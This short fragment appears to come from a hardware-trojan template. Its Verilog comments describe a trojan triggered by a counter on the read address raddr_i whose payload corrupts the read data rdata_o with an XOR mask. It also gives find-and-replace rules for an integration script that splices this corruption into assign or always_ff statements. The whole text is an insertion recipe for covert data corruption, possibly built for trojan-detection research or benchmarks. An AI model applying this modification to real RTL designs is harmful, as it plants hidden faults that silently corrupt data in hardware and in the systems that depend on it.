 ...
 *   
 * Trigger: Counter on raddr_i
 * Payload: Corrupt rdata_o with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt rdata_o with XOR
//
// Integration Script Must Modify:
//
// IF rdata_o is assigned:
//   Find: assign rdata_o = data_value;
//   Replace: assign rdata_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF rdata_o is in always_ff:
//   Find: rdata_o <= data_value;
//   Replace: rdata_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
